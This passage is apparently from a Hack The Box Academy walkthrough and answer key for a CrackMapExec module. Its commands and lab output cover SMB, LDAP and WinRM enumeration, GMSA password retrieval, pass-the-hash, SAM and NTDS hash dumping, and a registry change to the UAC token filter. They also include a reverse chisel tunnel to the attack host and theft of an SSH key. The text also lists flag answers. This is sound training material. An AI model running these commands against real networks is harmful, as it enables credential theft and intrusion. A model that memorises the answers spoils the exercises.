crackmapexec smb STMIP -u robert -p Inlanefreight01! --computers
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-9dtagelt38]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u robert -p Inlanefreight01! --computers

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
SMB         10.129.204.177  445    DC01             [+] Enumerated domain computer(s)
SMB         10.129.204.177  445    DC01             htb\inlanefreight$                
SMB         10.129.204.177  445    DC01             htb\inlanefreight$                
SMB         10.129.204.177  445    DC01             inlanefreight.htb\linux01$                      
SMB         10.129.204.177  445    DC01             inlanefreight.htb\MS01$                         
SMB         10.129.204.177  445    DC01             inlanefreight.htb\DC01$         
```

The other computer not shown in the section is revealed to be `linux01$`.

Answer: `linux01$`

# Mapping and Enumeration with SMB

## Question 3

### "What's the letter of the disk not present in the example?"

Students need to attack smb, authenticating as `robert:Inlanefreight01!` and using the `--disk` option to enumerate drives:

Code: shell

```shell
crackmapexec smb STMIP -u robert -p Inlanefreight01! --disk
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-9dtagelt38]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u robert -p Inlanefreight01! --disk

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
SMB         10.129.204.177  445    DC01             [+] Enumerated disks
SMB         10.129.204.177  445    DC01             C:
SMB         10.129.204.177  445    DC01             D:
SMB         10.129.204.177  445    DC01             K:
```

Students will find the `K` drive not previously shown in the example.

Answer: `K`

# Mapping and Enumeration with SMB

## Question 4

### "Up to how many RIDs does --rid-brute list by default?"

Students need to look at the help options for smb:

Code: shell

```shell
crackmapexec smb --help
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-9dtagelt38]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb --help

<SNIP>

  --rid-brute [MAX_RID]
                        enumerate users by bruteforcing RID's (default: 4000)
```

Looking at the information for `--rid-brute`, students will see it lists up to `4000` by default.

Answer: `4000`

# Mapping and Enumeration with SMB

## Question 5

### "What's the RID of the object Flag?"

Students need to target smb, authenticating as `robert:Inlanefreight01!` while utilize the `--rid-brute` option:

Code: shell

```shell
crackmapexec smb STMIP -u robert -p Inlanefreight01! --rid-brute
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-9dtagelt38]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u robert -p Inlanefreight01! --rid-brute
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
SMB         10.129.204.177  445    DC01             [+] Brute forcing RIDs

<SNIP>

SMB         10.129.204.177  445    DC01             3103: INLANEFREIGHT\Flag (SidTypeGroup)
```

The RID for Flag is shown to be `3103`.

Answer: `3103`

# LDAP and RDP Enumeration

## Question 1

### "Which account other than the Guest account does not require a password?"

Students need to authenticate as `robert:Inlanefreight01!` while attacking LDAP and utilizing the `--password-not-required` option:

Code: shell

```shell
crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --password-not-required
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-nairjhpquc]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --password-not-required

SMB         inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        inlanefreight.htb 389    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LDAP        inlanefreight.htb 389    DC01             User: Guest Status: enabled
LDAP        inlanefreight.htb 389    DC01             User: jorge Status: enabled
```

The other account not requiring a password is shown to be `jorge`.

Answer: `jorge`

# LDAP and RDP Enumeration

## Question 2

### "To which shared resource does the account that does not have a password have Write and Read access?"

Students need to target smb, authenticating as `jorge` with an empty password while also using the option to list shares:

Code: shell

```shell
crackmapexec smb dc01.inlanefreight.htb -u jorge -p '' --shares
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-nairjhpquc]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb dc01.inlanefreight.htb -u jorge -p '' --shares

SMB         inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         inlanefreight.htb 445    DC01             [+] inlanefreight.htb\jorge: 
SMB         inlanefreight.htb 445    DC01             [+] Enumerated shares
SMB         inlanefreight.htb 445    DC01             Share           Permissions     

<SNIP>

SMB         inlanefreight.htb 445    DC01             linux01         READ,WRITE      
```

It is revealed that the account has read/write access to the `linux01` share.

Answer: `linux01`

# LDAP and RDP Enumeration

## Question 3

### "Identify to which GSMA account jorge has access to read the password."

Students need to target `winrm`, authenticating as `robert:Inlanefreight01!` while running a command, specifically a `PowerShell` cmdlet to identify GMSA password retrieval policy:

Code: shell

```shell
crackmapexec winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-nairjhpquc]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"

SMB         inlanefreight.htb 5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
HTTP        inlanefreight.htb 5985   DC01             [*] http://inlanefreight.htb:5985/wsman
WINRM       inlanefreight.htb 5985   DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WINRM       inlanefreight.htb 5985   DC01             [+] Executed command
WINRM       inlanefreight.htb 5985   DC01             

DistinguishedName                          : CN=svc_inlaneadm,CN=Managed Service Accounts,DC=inlanefreight,DC=htb
Enabled                                    : True
Name                                       : svc_inlaneadm
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 6328a77f-9696-40b4-82b7-725ac19564b6
PrincipalsAllowedToRetrieveManagedPassword : {CN=engels,CN=Users,DC=inlanefreight,DC=htb}
SamAccountName                             : svc_inlaneadm$
SID                                        : S-1-5-21-3325992272-2815718403-617452758-6123
UserPrincipalName                          : 

DistinguishedName                          : CN=svc_gmsa,CN=Managed Service Accounts,DC=inlanefreight,DC=htb
Enabled                                    : True
Name                                       : svc_gmsa
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 32a13d48-7577-4950-87c8-26f2ef94d271
PrincipalsAllowedToRetrieveManagedPassword : {CN=jorge,CN=Users,DC=inlanefreight,DC=htb}
SamAccountName                             : svc_gmsa$
SID                                        : S-1-5-21-3325992272-2815718403-617452758-7104
UserPrincipalName                          : 
```

Students will discover they can read the password for the `svc_gmsa` account.

Answer: `svc_gmsa$`

# LDAP and RDP Enumeration

## Question 4

### "Use the service account you found to access the shared folder serviceaccount and read the flag."

Students need to target ldap, authenticating as `jorge` with an empty password while utilizing the `--gmsa` option:

Code: shell

```shell
crackmapexec ldap dc01.inlanefreight.htb -u jorge -p '' --gmsa
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-nairjhpquc]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec ldap dc01.inlanefreight.htb -u jorge -p '' --gmsa

SMB         inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        inlanefreight.htb 636    DC01             [+] inlanefreight.htb\jorge: 
LDAP        inlanefreight.htb 636    DC01             [*] Getting GMSA Passwords
LDAP        inlanefreight.htb 636    DC01             Account: svc_gmsa$            NTLM: ef115e76770d344823faaa8e1d7ba38a
```

Next, students will use the Hash along with the `spider_plus` module to enumerate the target further:

Code: shell

```shell
crackmapexec smb dc01.inlanefreight.htb -u svc_gmsa$ -H 80ab81532738487f69c89337c0d77abf -M spider_plus -o 
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-nairjhpquc]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb dc01.inlanefreight.htb -u svc_gmsa$ -H 80ab81532738487f69c89337c0d77abf -M spider_plus -o 

EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL,linux01,CertEnroll
SMB         inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         inlanefreight.htb 445    DC01             [+] inlanefreight.htb\svc_gmsa$:80ab81532738487f69c89337c0d77abf 
SPIDER_P... inlanefreight.htb 445    DC01             [*] Started spidering plus with option:
SPIDER_P... inlanefreight.htb 445    DC01             [*]        DIR: ['ipc$', 'print$', 'netlogon', 'sysvol', 'linux01', 'certenroll']
SPIDER_P... inlanefreight.htb 445    DC01             [*]        EXT: ['ico', 'lnk']
SPIDER_P... inlanefreight.htb 445    DC01             [*]       SIZE: 51200
SPIDER_P... inlanefreight.htb 445    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
```

The output is saved to a file:

Code: shell

```shell
cat inlanefreight.htb.json 
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-nairjhpquc]─[/tmp/cme_spider_plus]
└──╼ [★]$ cat inlanefreight.htb.json 
{
    "serviceaccount": {
        "flag.txt": {
            "atime_epoch": "2022-12-01 17:07:57",
            "ctime_epoch": "2022-12-01 17:01:35",
            "mtime_epoch": "2022-12-01 17:08:20",
            "size": "30 Bytes"
        }
    }
}
```

With the location of the flag revealed, students will use `CrackMapExec` to retrieve the flag and save it to their attack host:

Code: shell

```shell
crackmapexec smb dc01.inlanefreight.htb -u svc_gmsa$ -H ef115e76770d344823faaa8e1d7ba38a --share serviceaccount --get-file flag.txt serviceflag.txt
cat serviceflag.txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-nairjhpquc]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb dc01.inlanefreight.htb -u svc_gmsa$ -H ef115e76770d344823faaa8e1d7ba38a --share serviceaccount --get-file flag.txt serviceflag.txt

SMB         inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         inlanefreight.htb 445    DC01             [+] inlanefreight.htb\svc_gmsa$:ef115e76770d344823faaa8e1d7ba38a 
SMB         inlanefreight.htb 445    DC01             [*] Copy flag.txt to serviceflag.txt
SMB         inlanefreight.htb 445    DC01             [+] File flag.txt was transferred to serviceflag.txt

(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-nairjhpquc]─[~/CrackMapExec]
└──╼ [★]$ cat serviceflag.txt

Us1nG_S3rv1C3_4Cco7nts_H@$sh4S
```

The can finally be read as `Us1nG_S3rv1C3_4Cco7nts_H@$sh4S`.

Answer: `Us1nG_S3rv1C3_4Cco7nts_H@$sh4S`

# LDAP and RDP Enumeration

## Question 5

### "Use --screenshot to take a picture using Julio / Password1 creds, then submit DONE as the answer when finished."

Students need to use `--screenshot` to take a picture using the creds `Julio:Password1` and then type `DONE` when finished:

Code: shell

```shell
crackmapexec rdp dc01.inlanefreight.htb -u julio -p Password1 --screenshot --screentime 5 --res 1280x720
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-nairjhpquc]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec rdp dc01.inlanefreight.htb -u julio -p Password1 --screenshot --screentime 5 --res 1280x720

RDP         inlanefreight.htb 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:inlanefreight.htb) (nla:False)
RDP         inlanefreight.htb 3389   DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
RDP         inlanefreight.htb 3389   DC01             Screenshot saved /home/htb-ac594497/.cme/screenshots/DC01_inlanefreight.htb_2023-01-11_165931.png
```

Answer: `DONE`

# Command Execution

## Question 1

### "Use reg to change the LocalAccountTokenFilterPolicy to 1 and try to execute commands as localadmin:Password99!. Submit the flag located nn the localadmin desktop."

Students need to target smb, authenticating as `administrator:AnotherC0mpl3xP4$$` and making the appropriate change to the registry:

Code: shell

```shell
crackmapexec smb STMIP -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth -x "reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.178 -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth -x "reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"

SMB         10.129.204.178  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.129.204.178  445    MS01             [+] MS01\Administrator:AnotherC0mpl3xP4$$ (Pwn3d!)
SMB         10.129.204.178  445    MS01             [+] Executed command 
SMB         10.129.204.178  445    MS01             The operation completed successfully.
```

Once the operation is completed successfully, students need to now authenticate locally as `localadmin:Password99!` while using command execution to read the flag:

Code: shell

```shell
crackmapexec smb STMIP -u localadmin -p Password99! --local-auth -x "more C:\Users\localadmin\Desktop\flag.txt"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.178 -u localadmin -p Password99! --local-auth -x "more C:\Users\localadmin\Desktop\flag.txt"

SMB         10.129.204.178  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.129.204.178  445    MS01             [+] MS01\localadmin:Password99! (Pwn3d!)
SMB         10.129.204.178  445    MS01             [+] Executed command 
SMB         10.129.204.178  445    MS01             N0_M0r3_FilT3r$
```

The flag reads `N0_M0r3_FilT3r$`.

Answer: `N0_M0r3_FilT3r$`

# Command Execution

## Question 2

### "Use proxychains to connect to the DC IP 172.16.1.10 and try to login with robert's credentials via SMB. Does robert have privileges to execute commands via SMB? (True or False)"

Students need to download chisel to their attack host and run it as a reverse server:

Code: shell

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
gunzip chisel.gz
chmod +x chisel 
./chisel server --reverse
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ gunzip chisel.gz 
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ chmod +x chisel 
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ ./chisel server --reverse
2023/01/16 21:45:13 server: Reverse tunnelling enabled
2023/01/16 21:45:13 server: Fingerprint y+fkseezQXLn/1Or4gDTIkjWX6bDGvO6yia9zFC1RZo=
2023/01/16 21:45:13 server: Listening on http://0.0.0.0:8080
```

Next, the `chisel.exe` file must be downloaded:

Code: shell

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
gunzip -d chisel.exe.gz
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ gunzip -d chisel.exe.gz 
```

The executable can be placed on the target machine using `CrackMapExec`:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p 'Inlanefreight01!' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.178 -u grace -p 'Inlanefreight01!' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe

SMB         10.129.204.178  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.178  445    MS01             [+] inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.178  445    MS01             [*] Copy ./chisel.exe to \Windows\Temp\chisel.exe
SMB         10.129.204.178  445    MS01             [+] Created file ./chisel.exe on \\C$\\Windows\Temp\chisel.exe
```

And then, using command execution, `chisel.exe` can be used to make the target connect back to the attack host:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p 'Inlanefreight01!' -x "C:\Windows\Temp\chisel.exe client PWNIP:8080 R:socks"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.178 -u grace -p 'Inlanefreight01!' -x "C:\Windows\Temp\chisel.exe client 10.10.15.68:8080 R:socks"
SMB         10.129.204.178  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.178  445    MS01             [+] inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)

[*] completed: 100.00% (1/1)
```

Students need to check their chisel server to ensure that the pivot host has connected:

```
2023/01/16 21:45:13 server: Reverse tunnelling enabled
2023/01/16 21:45:13 server: Fingerprint y+fkseezQXLn/1Or4gDTIkjWX6bDGvO6yia9zFC1RZo=
2023/01/16 21:45:13 server: Listening on http://0.0.0.0:8080
2023/01/16 21:51:08 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Additionally, `proxychains` must be configured to use port 1080 as a socks5 proxy:

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

Finally, students can enumerate the internal 172.16.1.10 machine:

Code: shell

```shell
 proxychains crackmapexec smb 172.16.1.10 -u robert -p Inlanefreight01!
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ proxychains crackmapexec smb 172.16.1.10 -u robert -p Inlanefreight01!
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:135-<><>-OK
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
```

When students try to execute commands, they will find the user cannot, therefore, it is `False`.

Answer: `False`

# Command Execution

## Question 3

### "Use proxychains to connect to the DC IP 172.16.1.10 and try to login with robert's credentials via WINRM. Submit the flag located in robert's desktop."

Taking advantage of the port forwarding that was previously established, students need target `winrm`, authenticating as `robert:Inlanefreight01!` while using command execution to read the flag:

Code: shell

```shell
proxychains crackmapexec winrm 172.16.1.10 -u robert -p Inlanefreight01! -x "more c:\users\robert\Desktop\flag.txt"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ proxychains crackmapexec winrm 172.16.1.10 -u robert -p Inlanefreight01! -x "more c:\users\robert\Desktop\flag.txt"

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:5986-<--timeout
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
SMB         172.16.1.10     5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
HTTP        172.16.1.10     5985   DC01             [*] http://172.16.1.10:5985/wsman
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:5985-<><>-OK
WINRM       172.16.1.10     5985   DC01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
WINRM       172.16.1.10     5985   DC01             [+] Executed command
WINRM       172.16.1.10     5985   DC01             R0bert_G3tting_4cc3S
```

The flag reads `R0bert_G3tting_4cc3S`.

Answer: `R0bert_G3tting_4cc3S`

# Command Execution

## Question 4

### "Copy the file named julio\_keys from the target Administrator's desktop and authenticate using the file with SSH. Submit the flag in Julio's desktop."

Code: shell

```shell
crackmapexec smb STMIP -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth --get-file \\Users\\Administrator\\Desktop\\julio_keys julio_keys
ls -la | grep julio
crackmapexec ssh 10.129.204.178 -u julio -p '' --key-file julio_keys -x "more C:\users\julio\desktop\flag.txt"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.178 -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth --get-file \\Users\\Administrator\\Desktop\\julio_keys julio_keys

SMB         10.129.204.178  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.129.204.178  445    MS01             [+] MS01\Administrator:AnotherC0mpl3xP4$$ (Pwn3d!)
SMB         10.129.204.178  445    MS01             [*] Copy \Users\Administrator\Desktop\julio_keys to julio_keys
SMB         10.129.204.178  445    MS01             [+] File \Users\Administrator\Desktop\julio_keys was transferred to julio_keys
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ ls -la | grep julio
-rw-r--r-- 1 htb-ac594497 htb-ac594497     419 Jan 16 22:07 julio_keys
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-gth154ehme]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec ssh 10.129.204.178 -u julio -p '' --key-file julio_keys -x "more C:\users\julio\desktop\flag.txt"

SSH         10.129.204.178  22     10.129.204.178   [*] SSH-2.0-OpenSSH_for_Windows_7.7
SSH         10.129.204.178  22     10.129.204.178   [+] julio: (keyfile: julio_keys) 
SSH         10.129.204.178  22     10.129.204.178   [+] Executed command
SSH         10.129.204.178  22     10.129.204.178   K3y_F1l3s_EveryWh3r3
```

The flag reads `K3y_F1l3s_EveryWh3r3`.

Answer: `K3y_F1l3s_EveryWh3r3`

# Finding Secrets and Using Them

## Question 1

### "Extract the local database and submit the user's hash with ID 1006 as the answer."

Students need to target smb, authenticating as `robert:Inlanefreight01!` and utilizing the `--sam` option to dump hashes:

Code: shell

```shell
crackmapexec smb STMIP -u robert -p 'Inlanefreight01!' --sam
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-0yf7svtvok]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.19.153 -u robert -p 'Inlanefreight01!' --sam

SMB         10.129.19.153   445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.19.153   445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB         10.129.19.153   445    MS01             [+] Dumping SAM hashes
SMB         10.129.19.153   445    MS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0660cf3453:::
SMB         10.129.19.153   445    MS01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.19.153   445    MS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.19.153   445    MS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
SMB         10.129.19.153   445    MS01             localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236ed3f3ac:::
SMB         10.129.19.153   445    MS01             sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f6:::
SMB         10.129.19.153   445    MS01             htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701:::
SMB         10.129.19.153   445    MS01             [+] Added 7 SAM hashes to the database
```

The password hash for ID 1006 is shown to be `6593d8c034bbe9db50e4ce94b1943701`.

Answer: `6593d8c034bbe9db50e4ce94b1943701`

# Finding Secrets and Using Them

## Question 2

### "Which domain account, other than Guest and krbtgt, is disabled?"

Students need to make sure that `Chisel` server is running from `Pwnbox`, and that Windows target is configured as a chisel host. Using a socks5 proxy, students will target SMB on the internal domain controller authenticating as `robert:Inlanefreight01!` and dumping the NTDS secrets:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight01!' --ntds --enabled
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-sooxhmznen]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight01!' --ntds --enabled

<SNIP>

SMB         172.16.1.10     445    DC01             [+] Dumped 23 NTDS hashes to /home/htb-ac594497/.cme/logs/DC01_172.16.1.10_2023-01-12_170459.ntds of which 20 were added to the database
SMB         172.16.1.10     445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         172.16.1.10     445    DC01             [*] cat /home/htb-ac594497/.cme/logs/DC01_172.16.1.10_2023-01-12_170459.ntds | grep -iv disabled | cut -d ':' -f1
```

Once the log file is generated, students need to `cat` the file and filter for disabled accounts:

Code: shell

```shell
cat /home/htb-ac594497/.cme/logs/DC01_172.16.1.10_2023-01-12_170459.ntds | grep -i disabled | cut -d ':' -f1
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-sooxhmznen]─[~/CrackMapExec]
└──╼ [★]$ cat /home/htb-ac594497/.cme/logs/DC01_172.16.1.10_2023-01-12_170459.ntds | grep -i disabled | cut -d ':' -f1

Guest
krbtgt
inlanefreight.htb\harris
```

Answer: `harris`

# Finding Secrets and Using Them

## Question 3

### "What's the hash of the account named soti?"

Students need to look at the output of the previously dumped NTDS secrets log file, filtering for the account named `soti`:

Code: shell

```shell
cat /home/htb-ac594497/.cme/logs/DC01_172.16.1.10_2023-01-12_170459.ntds | grep soti
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-sooxhmznen]─[~/CrackMapExec]
└──╼ [★]$ cat /home/htb-ac594497/.cme/logs/DC01_172.16.1.10_2023-01-12_170459.ntds | grep soti

inlanefreight.htb\soti:7105:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d::: (status=Enabled)
```

Answer: `1bc3af33d22c1c2baec10a32db22c72d`

# Finding Secrets and Using Them

## Question 4

### "Use soti's hash to authenticate to 172.16.1.10 and get the flag from soti's desktop."

Students need to target `winrm`, passing the hash while authenticating as `soti:1bc3af33d22c1c2baec10a32db22c72d` in order to read the flag.txt file on the desktop for the `soti` user:

Code: shell

```shell
proxychains4 -q crackmapexec winrm 172.16.1.10 -u soti -H 1bc3af33d22c1c2baec10a32db22c72d -x "more c:\users\soti\desktop\flag.txt"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-sooxhmznen]─[~/CrackMapExec]
